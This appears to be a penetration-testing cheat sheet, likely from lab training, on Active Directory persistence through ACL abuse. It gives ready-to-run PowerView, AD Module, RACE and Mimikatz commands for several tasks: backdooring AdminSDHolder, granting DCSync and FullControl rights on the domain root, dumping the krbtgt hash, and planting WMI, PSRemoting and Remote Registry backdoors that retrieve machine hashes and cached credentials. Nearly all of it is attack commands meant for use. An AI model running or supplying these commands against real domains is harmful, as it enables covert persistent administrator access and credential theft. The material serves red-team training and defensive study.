# Domain Persistence - Using ACLs

- [Domain Persistence - Using ACLs](#domain-persistence---using-acls)
  - [AdminSDHolder](#adminsdholder)
  - [Rights Abuse](#rights-abuse)
  - [Security Descriptors](#security-descriptors)

---

## AdminSDHolder

**AdminSDHolder** resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called **Protected Groups**).

**Security Descriptor Propagator (SDPROP)** runs every hour and compares the ACL of protected groups and members with the ACL of **AdminSDHolder** and any differences are overwritten on the object ACL.

<br/>

| Protected Groups | |
|---|---|
|Account Operators|Enterprise Admins|
|Backup Operatros|Domain Controllers|
|Server Operators|Read-only Domain Controllers|
|Printer Operators|Schema Admins|
|Domain Admins|Administrators|
|Replicator| |

<br/>

Well known abuse of some of the Protected Groups - All of the below can log on locally to DC

|Protected Group | |
|--|--|
| Account Operators| Cannot modify DA/EA/BA groups. Can modify nested group within these groups. |
| Backup Operators | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
| Server Operators | Run a command as system (using the disabled Browser service) |
| Print Operators | Copy `ntds.dit` backup, load device drivers. |

<br/>

With DA privileges (Full Control/Write permissions) on the `AdminSDHolder` object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the `AdminSDHolder` object.

<br/>

In 60 minutes (when `SDPROP` runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

<br/>

Add `FullControl` permissions for a user to the `AdminSDHolder` as DA:

- PowerView

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

- AD Module & RACE toolkit (https://github.com/samratashok/RACE)

```
Set-ADACL -DistinguishedName 'DC=us,DC=techcorp,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose
```

<br/>

Other interesting permissions (ResetPassword, WriteMembers) for a user to the `AdminSDHolder`:

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser64 -Rights ResetPassword -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser64 -Rights WriteMembers -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

<br/>

Run `SDProp` manually using `Invoke-SDPropagator.ps1` from Tools directory:

```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

For pre-Server 2008:

```
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

<br/>

**Check the Domain Admins permission as normal user:**

- PowerView

```
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser64"}
```

- AD Module

```
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local').Access | ?{$_.IdentityReference -match 'studentuser1'}
```

<br/>

**Abusing Full Control:**

- PowerView

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

- AD Module

```
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

<br/>

**Abusing ResetPassword:**

- PowerView

```
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

- AD Module

```
Set-ADAccountPassword -Identity testda -NewPassword
(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

<br/>

---

## Rights Abuse

There are even more interesting ACLs which can be abused.

For example, with DA privileges, the **ACL for the domain root** can be
modified to provide useful rights like **FullControl** or the ability to run "**DCSync**".

<br/>

**Add FullControl rights:**

- PowerView

```
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser64 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

- AD Module + RACE:

```
Set-ADACL -SamAccountName studentuser64 DistinguishedName 'DC=us,DC=techcorp,DC=local' -Right GenericAll -Verbose
```

<br/>

**Add rights for DCSync:**

- PowerView

```
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser64 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

- AD Module

```
Set-ADACL -SamAccountName studentuser64 DistinguishedName 'DC=us,DC=techcorp,DC=local' -GUIDRight DCSync -Verbose
```

<br/>

**Execute DCSync**

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

or

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

<br/>

----

## Security Descriptors

It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.

**Administrative privileges** are required for this. It, of course, works as a very useful and impactful backdoor mechanism.

<br/>

**Security Descriptor Definition Language (SDDL)** defines the format which is used to describe a security descriptor. **SDDL** uses ACE strings for DACL and SACL:

```
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
```

- ACE for built-in administrators for WMI namespaces:<br/>
`A;CI;CCDCLCSWRPWPRCWD;;;SID`

<br/>

**Security Descriptors - WMI**

ACLs can be modified to allow non-admin users access to securable objects. Using the **RACE toolkit**:

```
. C:\AD\Tools\RACE-master\RACE.ps1
```

- On local machine:

```
Set-RemoteWMI -SamAccountName studentuser64 –Verbose
```

- On remoate machine for `student64` without explicit credentials:

```
Set-RemoteWMI -SamAccountName studentuser64 -ComputerName us-dc -Verbose
```

- On remote machine with explicit credentials. Only `root\cimv2` and nested namespaces:

```
Set-RemoteWMI -SamAccountName studentuser64 -ComputerName us-dc -Credential Administrator –namespace 'root\cimv2' -Verbose
```

- On remote machine **remove** permissions:

```
Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
```

<br/>

**Security Descriptors - PSRemoting**

Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches:

- On local machine for abuser:

```
Set-RemotePSRemoting -SamAccountName studentuser64 –Verbose
```

- On remote machine for studentuser64 without credentials:

```
Set-RemotePSRemoting -SamAccountName studentuser64 -ComputerName us-dc -Verbose
```

- On remote machine, remove the permissions:

```
Set-RemotePSRemoting -SamAccountName studentuser64 -ComputerName us-dc -Remove
```

<br/>

**Security Descriptors - Remote Registry**

Using RACE or DAMP toolkit, with admin privs on remote machine:

```
Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuser64 -Verbose
```

As `studentuser64`, retrieve machine account hash:

```
Get-RemoteMachineAccountHash -ComputerName us-dc -Verbose
```

Retrieve local account hash:

```
Get-RemoteLocalAccountHash -ComputerName us-dc -Verbose
```

Retrieve domain cached credentials:

```
Get-RemoteCachedCredential -ComputerName us-dc -Verbose
```

<br/>

---